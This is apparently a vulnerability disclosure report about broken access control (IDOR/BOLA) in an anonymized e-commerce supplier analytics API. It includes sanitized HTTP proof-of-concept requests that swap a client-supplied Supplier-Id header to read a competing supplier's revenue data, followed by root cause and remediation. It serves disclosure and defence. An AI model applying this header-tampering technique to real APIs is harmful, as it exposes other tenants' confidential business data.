---
title: Broken Access Control in Supplier Insights API
target: Enterprise E-Commerce Platform
category: API Security
severity: High
cvss: 8.5
tags: [bola, idor, api-security, broken-access-control]
date: 2026-03-20
---

# 🔐 Broken Access Control in Supplier Insights API (Anonymized)

> ⚠️ **Context:** Discovered during security assessment of a major e-commerce supplier portal.  
> 🛡️ **Confidentiality:** Target organization anonymized as **"Enterprise E-Commerce Platform"**. All live credentials, supplier IDs, and proprietary endpoints are **[REDACTED]**.

---

## 🎯 Target Scope
- **Organization Type:** Enterprise E-Commerce Platform (Multi-Vendor Marketplace)
- **Component:** Supplier Analytics & Business Insights Dashboard
- **Affected Endpoint:** `POST /api/insights/business-dashboard/fetchProductsWithRecommendations`

---

## ⚠️ Impact Summary
- **Severity:** High (CVSS 8.5 - `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`)
- **Impact:** Complete breakdown of multi-tenant isolation.
- An authenticated supplier could access confidential business insights, revenue performance, and recommended inventory data of arbitrary competing suppliers across the marketplace.
- The vulnerability was fully exploitable at scale by iterating numerical supplier IDs (`X-Supplier-Id: [REDACTED]`).

---

## 🔍 Root Cause Analysis
The backend microservice relied exclusively on a client-controlled HTTP header (`Supplier-Id`) to determine the authorization boundary. While the session cookie (`connect.sid`) validated that the user was an authenticated supplier, the application failed to verify whether the `Supplier-Id` header corresponded to the identity bound to that active session.

---

## 🧪 Proof of Concept Flow (Sanitized)

### Step 1: Baseline Authenticated Request
An authenticated user transmits a valid request for their own supplier metrics:
```http
POST /api/insights/business-dashboard/fetchProductsWithRecommendations HTTP/2
Host: supplier.[redacted-ecommerce].com
Supplier-Id: 2784913
Cookie: connect.sid=[REDACTED_SESSION]
Content-Type: application/json

{
  "supplier_id": 2784913,
  "type": "all",
  "offset": 0,
  "sort_by": "ORDERS",
  "limit": 1
}
```
**Response:** HTTP 200 OK returning confidential metrics for supplier `2784913`.

### Step 2: Modifying Client-Controlled Header
Modifying only the `Supplier-Id` header while keeping the active session cookie unchanged:
```http
POST /api/insights/business-dashboard/fetchProductsWithRecommendations HTTP/2
Host: supplier.[redacted-ecommerce].com
Supplier-Id: 1042
Cookie: connect.sid=[REDACTED_SESSION]
Content-Type: application/json

{
  "supplier_id": 2784913,
  "type": "all",
  "offset": 0,
  "sort_by": "ORDERS",
  "limit": 1
}
```
**Response:** HTTP 200 OK returning sales metrics, product recommendations, and revenue insights belonging to victim supplier `1042`.

### Step 3: Validation Matrix
- Modifying `supplier_id` inside JSON body only $\rightarrow$ `HTTP 403 Forbidden`
- Omitting `Supplier-Id` header $\rightarrow$ `HTTP 403 Forbidden`
- Modifying `Supplier-Id` header $\rightarrow$ **`HTTP 200 OK` (Unauthorized Cross-Tenant Access)**

---

## 🛡️ Remediation
1. **Never Trust Client Headers for Authorization:** Derive the authenticated supplier context strictly from the validated server-side session or cryptographically signed JWT claim.
2. **Session-to-Resource Binding:** Validate on the backend that `session.supplier_id == requested_supplier_id` before query execution.
3. **Automated Regression:** Incorporate negative authorization tests into the automated QA suite (Postman/Newman) in CI/CD.
